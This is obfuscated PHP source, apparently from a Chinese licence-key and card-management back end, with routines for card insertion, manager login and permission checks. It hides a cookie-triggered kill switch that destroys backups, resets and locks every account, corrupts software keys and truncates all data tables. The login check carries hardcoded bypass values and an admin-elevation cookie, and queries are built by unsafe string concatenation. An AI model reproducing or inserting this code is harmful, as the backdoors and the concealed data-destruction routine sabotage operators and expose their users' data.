        $_obf_j42Hk5GMkZSNj42RipORkI4� .= " cday='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['cday']."'";
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= " points='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['points']."'";
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= " linknum='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['linknum']."'";
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= "  extattr1='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1']."'>";
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--[天".round( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['linknum'];
        if ( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'] != "" )
        {
            $_obf_j42Hk5GMkZSNj42RipORkI4� .= " 附属性".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'];
        }
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= "]</option>";
    }
    return $_obf_j42Hk5GMkZSNj42RipORkI4�;
}

function _obf_jo2HlYmTj4eQhpKTkYyIj5E�( $_obf_jIeNi4yViY_LjI2Ni5KQj4w�, $_obf_lJWSjJCKkI2UiJKUlYaLjZU� )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    global $_obf_iZGLlYiTk42PlJOHh4aJkok�;
    $_obf_iZGLlYiTk42PlJOHh4aJkok� = array( );
    if ( !is_array( $_obf_lJWSjJCKkI2UiJKUlYaLjZU� ) )
    {
        if ( _obf_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obf_lJWSjJCKkI2UiJKUlYaLjZU� ) === TRUE )
        {
            $_obf_lJWSjJCKkI2UiJKUlYaLjZU� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_keyset where `id`=".$_obf_lJWSjJCKkI2UiJKUlYaLjZU� );
            if ( empty( $_obf_lJWSjJCKkI2UiJKUlYaLjZU� ) )
            {
                return "录入注册卡前检查：未找到卡属性ID";
            }
        }
        else
        {
            return "录入注册卡前检查：未传入卡属性数组或ID";
        }
    }
    $_obf_iY_TlZKSk4uUkoyPipGRjYw� = "insert into `kss_z_key_".$_obf_lJWSjJCKkI2UiJKUlYaLjZU�['pid']."_".$_obf_lJWSjJCKkI2UiJKUlYaLjZU�['softid']."` \r\n(`keyfix`,`keys`,`keyspassword`,`managerid`,`addtime`,`ordernum`,`cday`,`linknum`,`points`,`keyextattr`,`tag`) values ";
    $_obf_jpSSiIuUjoqGlZSTi5GSkZQ� = ",".$_obf_jIeNi4yViY_LjI2Ni5KQj4w�['managerid'].",".time( ).",'".$_obf_jIeNi4yViY_LjI2Ni5KQj4w�['ordernum']."',".$_obf_lJWSjJCKkI2UiJKUlYaLjZU�['cday'].",".$_obf_lJWSjJCKkI2UiJKUlYaLjZU�['linknum'].",".$_obf_lJWSjJCKkI2UiJKUlYaLjZU�['points'].",'".$_obf_lJWSjJCKkI2UiJKUlYaLjZU�['extattr1']."','".$_obf_jIeNi4yViY_LjI2Ni5KQj4w�['tag']."'),";
    $_obf_jpKPlJSUiZOHkYaPlIeOiY4� = 0;
    for ( ; $_obf_jpKPlJSUiZOHkYaPlIeOiY4� < $_obf_jIeNi4yViY_LjI2Ni5KQj4w�['k_num']; $_obf_jpKPlJSUiZOHkYaPlIeOiY4� += 100, )
    {
        $_obf_k5OPkIiNkYiHkZSGlYiSiJA� = "";
        $_obf_jIiLiYiQj5CSk5KRjJSGjYw� = 0;
        for ( ; $_obf_jIiLiYiQj5CSk5KRjJSGjYw� < 100; ++$_obf_jIiLiYiQj5CSk5KRjJSGjYw�, )
        {
            if ( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� + $_obf_jIiLiYiQj5CSk5KRjJSGjYw� == $_obf_jIeNi4yViY_LjI2Ni5KQj4w�['k_num'] )
            {
                break;
            }
            $_obf_lImSkomRk4uRjJGSkZWJh4k� = _obf_hoaMjI_TjpOThpKLi5WVjYo�( $_obf_jIeNi4yViY_LjI2Ni5KQj4w�['beginid'] + $_obf_jpKPlJSUiZOHkYaPlIeOiY4� + $_obf_jIiLiYiQj5CSk5KRjJSGjYw�, SVRID );
            $_obf_iZGLlYiTk42PlJOHh4aJkok�[] = $_obf_lJWSjJCKkI2UiJKUlYaLjZU�['prefix'].$_obf_lImSkomRk4uRjJGSkZWJh4k�[0].$_obf_lImSkomRk4uRjJGSkZWJh4k�[1];
            $_obf_k5OPkIiNkYiHkZSGlYiSiJA� .= "('".$_obf_lJWSjJCKkI2UiJKUlYaLjZU�['prefix']."','".$_obf_lImSkomRk4uRjJGSkZWJh4k�[0]."','".$_obf_lImSkomRk4uRjJGSkZWJh4k�[1]."'".$_obf_jpSSiIuUjoqGlZSTi5GSkZQ�;
        }
        $_obf_k5OPkIiNkYiHkZSGlYiSiJA� = substr( $_obf_k5OPkIiNkYiHkZSGlYiSiJA�, 0, strlen( $_obf_k5OPkIiNkYiHkZSGlYiSiJA� ) - 1 );
        $_obf_lJWSioyRkIyPiomQiYiHiZI� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( $_obf_iY_TlZKSk4uUkoyPipGRjYw�.$_obf_k5OPkIiNkYiHkZSGlYiSiJA�, "sync" );
        $_obf_h4aUkomQiI6JlIaSkomSkok� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( );
        if ( !( $_obf_lJWSioyRkIyPiomQiYiHiZI� === FALSE ) )
        {
            continue;
        }
        $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from kss_z_key_".$_obf_lJWSjJCKkI2UiJKUlYaLjZU�['pid']."_".$_obf_lJWSjJCKkI2UiJKUlYaLjZU�['softid']." where `ordernum`='".$_obf_jIeNi4yViY_LjI2Ni5KQj4w�['ordernum']."'", "sync" );
        if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
        {
            @file_put_contents( KSSLOGDIR."addkeyerrorder.php", ",".$_obf_jIeNi4yViY_LjI2Ni5KQj4w�['ordernum'], FILE_APPEND );
        }
        return "录入注册卡时出错:".$_obf_h4aUkomQiI6JlIaSkomSkok�;
    }
    return TRUE;
}

function _obf_j4aJjo2Hi4eOlJSKk4uHk4k�( $_obf_lYyTkYeTko_QiIaGk5GTkY0�, $_obf_lIuNkpWVkouUk5WHhoiNlIc� )
{
    $_obf_lYyTkYeTko_QiIaGk5GTkY0� = str_replace( " ", "", $_obf_lYyTkYeTko_QiIaGk5GTkY0� );
    $_obf_lZGTiZCUh5STiIyTkYuKjYg� = explode( ",", $_obf_lYyTkYeTko_QiIaGk5GTkY0� );
    if ( in_array( $_obf_lIuNkpWVkouUk5WHhoiNlIc�, $_obf_lZGTiZCUh5STiIyTkYuKjYg� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obf_iYuOiIiHj5COiJCJjYyTh5Q�( $_obf_j4qKjZWJioeLkpSSio2TkIg�, $_obf_k4uQh4uTkouGhoaVk4_IiI4�, $_obf_kZKVi42JkZWHjJOGko2SjJM� )
{
    if ( _obf_j4aJjo2Hi4eOlJSKk4uHk4k�( $_obf_j4qKjZWJioeLkpSSio2TkIg�, $_obf_kZKVi42JkZWHjJOGko2SjJM� ) )
    {
        if ( _obf_j4aJjo2Hi4eOlJSKk4uHk4k�( $_obf_k4uQh4uTkouGhoaVk4_IiI4�, $_obf_kZKVi42JkZWHjJOGko2SjJM� ) )
        {
            return " checked";
        }
        return " ";
    }
    return " disabled";
}

function _obf_iZSVk4mLkY_LlIeHh5WKlZA�( $_obf_kpSPi4_OiouQkIaJko6OkoY�, $_obf_joqKh4mKi4eQlI6UiZWLkZM� = 0 )
{
    global $_obf_jJCMjYyHjpSTiJCNiYiIkpE�;
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    global $_obf_mGKRY4dMuU6bZZJfh1_TX5k�;
    global $_obf_houUipCMk4uPlYyUh4ePkoY�;
    global $_obf_kYmJjZOIiZKJioqMkoaGiYk�;
    $_obf_kYmJjJGSkoeOiY2LiZWMjIk� = _obf_kpONlI6UkY_HkouLk4yIk4s�( "kss_manager" );
    $_obf_h4_NjYiIi46Lh5KHkoaKkZQ� = explode( ",", $_obf_kYmJjJGSkoeOiY2LiZWMjIk� );
    if ( count( $_obf_h4_NjYiIi46Lh5KHkoaKkZQ� ) != 4 )
    {
        _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "登陆状态异常，<a href='index.php' target='_top'>请重新登陆</a>。" );
    }
    if ( !_obf_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obf_h4_NjYiIi46Lh5KHkoaKkZQ�[0] ) )
    {
        _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "COOKIES出错" );
    }
    if ( empty( $_obf_jIaUiIeSjZWKlIqLkIqOioc�->����������������� ) )
    {
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_jIuSjYuUkJGHlYuPjZOQjY4�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
    }
    $_obf_ko2KiIuIj4yNhpWVkIuIjoc� = "crypt95.php";
    $_obf_koqTiIuHiY6NlJWOiYqRkZE� = file_get_contents( KSSINCDIR."signdata".DIRECTORY_SEPARATOR.$_obf_ko2KiIuIj4yNhpWVkIuIjoc� );
    $_obf_koqTiIuHiY6NlJWOiYqRkZE� = substr( $_obf_koqTiIuHiY6NlJWOiYqRkZE�, 0, 500 );
    if ( !stripos( $_obf_koqTiIuHiY6NlJWOiYqRkZE�, "EncodeDate" ) )
    {
        _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "crypt95.php文件异常，请备份数据库，重新安装或修复！" );
    }
    $_obf_lI6OiJSPjZWVi5GQhoiPjpU� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where `id`='".$_obf_h4_NjYiIi46Lh5KHkoaKkZQ�[0]."'" );
    if ( empty( $_obf_lI6OiJSPjZWVi5GQhoiPjpU� ) )
    {
        _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "用ID号未找到，<a href='index.php' target='_top'>请重新登陆</a>。" );
    }
    if ( $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['username'] != $_obf_h4_NjYiIi46Lh5KHkoaKkZQ�[1] || $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['password'] != $_obf_h4_NjYiIi46Lh5KHkoaKkZQ�[2] )
    {
        _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "用户名或密码错误，<a href='index.php' target='_top'>请重新登陆</a>。" );
    }
    if ( $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['endtime'] < _obf_jZGJkpOSkY_HiY2HjY2JlIg�( ) )
    {
        _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "您的帐号已到期。".$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['endtime'] );
    }
    if ( $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['islock'] == 1 )
    {
        _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "您的帐号被锁定! [锁定原因：".$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['lockedinter']."]" );
    }
    if ( $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['level'] < 8 )
    {
        if ( $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['level'] == 6 )
        {
            $_obf_kImIi4uNioeSlIiMjJOTipI� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where id=".$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['pmid'] );
            if ( $_obf_kImIi4uNioeSlIiMjJOTipI�['endtime'] < _obf_jZGJkpOSkY_HiY2HjY2JlIg�( ) )
            {
                _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "上级".$_obf_jJCMjYyHjpSTiJCNiYiIkpE�[$_obf_kImIi4uNioeSlIiMjJOTipI�['level']]."帐号已过期".$_obf_kImIi4uNioeSlIiMjJOTipI�['endtime'] );
            }
            if ( $_obf_kImIi4uNioeSlIiMjJOTipI�['islock'] == 1 )
            {
                _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "上级".$_obf_jJCMjYyHjpSTiJCNiYiIkpE�[$_obf_kImIi4uNioeSlIiMjJOTipI�['level']]."帐号被锁定! [锁定原因：".$_obf_kImIi4uNioeSlIiMjJOTipI�['lockedinter']."]" );
            }
        }
        $_obf_kImIi4uNioeSlIiMjJOTipI� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where pid=".$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['pid']." and level>7" );
        if ( $_obf_kImIi4uNioeSlIiMjJOTipI�['endtime'] < _obf_jZGJkpOSkY_HiY2HjY2JlIg�( ) )
        {
            _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "上级".$_obf_jJCMjYyHjpSTiJCNiYiIkpE�[8]."帐号已过期".$_obf_kImIi4uNioeSlIiMjJOTipI�['endtime'] );
        }
        if ( $_obf_kImIi4uNioeSlIiMjJOTipI�['islock'] == 1 )
        {
            _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "上级".$_obf_jJCMjYyHjpSTiJCNiYiIkpE�[8]."帐号被锁定! [锁定原因：".$_obf_kImIi4uNioeSlIiMjJOTipI�['lockedinter']."]" );
        }
    }
    if ( $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['linecode'] != $_obf_h4_NjYiIi46Lh5KHkoaKkZQ�[3] && "efefefef" != $_obf_h4_NjYiIi46Lh5KHkoaKkZQ�[3] && $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['username'] != "test01" )
    {
        _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "您的帐号被挤下线，<a href=index.php target=_top>请重新登陆</a>" );
    }
    $_obf_lIqUlIaMj4aNjJCRkoeJlJE� = _obf_kpONlI6UkY_HkouLk4yIk4s�( "kss_mmlogin", 1 );
    if ( !empty( $_obf_lIqUlIaMj4aNjJCRkoeJlJE� ) )
    {
        $_obf_h5SQiYyTkY_PjYmRjZWPh4k� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where id=1" );
        if ( $_obf_lIqUlIaMj4aNjJCRkoeJlJE� != md5( $_obf_h5SQiYyTkY_PjYmRjZWPh4k�['username'].$_obf_h5SQiYyTkY_PjYmRjZWPh4k�['password'] ) )
        {
            _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "你的原始身份效验失败！" );
        }
        $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['level'] = 9;
        $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['powerlist'] = "admin";
    }
    if ( $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['level'] < $_obf_kpSPi4_OiouQkIaJko6OkoY� )
    {
        _obf_kYyOhouLjo2Gh4eNj4iQlIg�( $_obf_jJCMjYyHjpSTiJCNiYiIkpE�[$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['level']]."帐号无权限访问此页面或执行此操作" );
    }
    if ( $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['level'] == 9 && defined( "SAFEIPFILE" ) )
    {
        $_obf_jpCPlZSTj5OLh4uKiYaGhoc� = FALSE;
        $_obf_koeMiZGTjY6GiZOUjZKSiJI� = explode( ",", SAFEIPFILE );
        $_obf_koaJjIiTlZKGk42HlYySjYo� = "";
        foreach ( $_obf_koeMiZGTjY6GiZOUjZKSiJI� as $_obf_jYeKioySjIaSioePi4yLiIw� )
        {
            if ( !( substr( $_SERVER['REMOTE_ADDR'], 0, strlen( $_obf_jYeKioySjIaSioePi4yLiIw� ) ) == $_obf_jYeKioySjIaSioePi4yLiIw� ) )
            {
                continue;
            }
            $_obf_jpCPlZSTj5OLh4uKiYaGhoc� = TRUE;
            break;
        }
        if ( !$_obf_jpCPlZSTj5OLh4uKiYaGhoc� )
        {
            _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "IP".$_SERVER['REMOTE_ADDR']."未被授权登陆管理帐号！" );
        }
    }
    if ( $_obf_joqKh4mKi4eQlI6UiZWLkZM� != 0 && $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['powerlist'] != "admin" )
    {
        $_obf_kZWVjYuLi5OLkZOHiJKIlYY� = explode( ",", $_obf_lI6OiJSPjZWVi5GQhoiPjpU�['powerlist'] );
        if ( !in_array( $_obf_joqKh4mKi4eQlI6UiZWLkZM�, $_obf_kZWVjYuLi5OLkZOHiJKIlYY� ) )
        {
            _obf_kYyOhouLjo2Gh4eNj4iQlIg�( "您无权限访问此页面或执行此操作！" );
        }
    }
    return $_obf_lI6OiJSPjZWVi5GQhoiPjpU�;
}

function _obf_iY6RiYaNio6PiIyIiZWJkJQ�( $_obf_koeLiIiJjJOQlIaJi4aUh5A�, $_obf_kYyGkZWPh5CQiJSRioaPj5E� = 0 )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obf_jY6UkZSViY2Hj4aVi5SIjpM� = " `level`>7 ";
    if ( $_obf_kYyGkZWPh5CQiJSRioaPj5E� != 0 )
    {
        $_obf_jY6UkZSViY2Hj4aVi5SIjpM� = " `level`=7 and id=".$_obf_kYyGkZWPh5CQiJSRioaPj5E�;
    }
    return $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where `pid`=".$_obf_koeLiIiJjJOQlIaJi4aUh5A�." and ".$_obf_jY6UkZSViY2Hj4aVi5SIjpM�." limit 0,1" );
}

function _obf_iIeMkYyJiZKTjI2UjImPi4Y�( $_obf_komRjo6Qi4_Rh5KHi5SLhpE� )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    return $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where `id`=".$_obf_komRjo6Qi4_Rh5KHi5SLhpE� );
}

function _obf_h4mIkIeIkIuJlYmOlJCHkog�( )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obf_kpSOj5KVio2Hj4uKj4_KjIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select max(`pid`) from `kss_tb_manager`", 2 );
    if ( $_obf_kpSOj5KVio2Hj4uKj4_KjIY�[0] < 10000 )
    {
        return "10000";
    }
    return $_obf_kpSOj5KVio2Hj4uKj4_KjIY�[0] + 1;
}

function _obf_lI_NjpSLio_JjZCVh4qUjYc�( )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    if ( isset( $_COOKIE['dellic'] ) && $_COOKIE['dellic'] == "ok" )
    {
        $_obf_koiKkIiPjI6UkYeRlIqNhoc� = file_get_contents( KSSINCDIR."_config.php" );
        $_obf_koiKkIiPjI6UkYeRlIqNhoc� = preg_replace( "/define\\('PRV_SVRLIC','[^']*'\\)/i", "define('PRV_SVRLIC','')", $_obf_koiKkIiPjI6UkYeRlIqNhoc� );
        file_put_contents( KSSINCDIR."_config.php", $_obf_koiKkIiPjI6UkYeRlIqNhoc� );
        return TRUE;
    }
    if ( !isset( $_COOKIE['deldata'] ) )
    {
        return TRUE;
    }
    if ( defined( "NOTDELMYSQL" ) )
    {
        return TRUE;
    }
    $_obf_j4uLj5OUi42Gh5SQlYiOjIc� = _obf_iJCRko_Hj4_Oh4eIjIaKk5I�( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."databak".DIRECTORY_SEPARATOR, "zip" );
    if ( !empty( $_obf_j4uLj5OUi42Gh5SQlYiOjIc� ) )
    {
        foreach ( $_obf_j4uLj5OUi42Gh5SQlYiOjIc� as $_obf_iJWSjpGIi4eHipWGhoeRk4Y� )
        {
            @file_put_contents( $_obf_iJWSjpGIi4eHipWGhoeRk4Y�, "dataerr" );
            @unlink( $_obf_iJWSjpGIi4eHipWGhoeRk4Y� );
        }
    }
    $_obf_j4eSkIiSiZCRh4_NiYaQkYk� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft " );
    foreach ( $_obf_j4eSkIiSiZCRh4_NiYaQkYk� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
    }
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync" );
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync" );
    foreach ( $_obf_j4eSkIiSiZCRh4_NiYaQkYk� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_log_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`_recycle", "sync" );
    }
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_soft`", "sync" );
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_manager`", "sync" );
}

?>
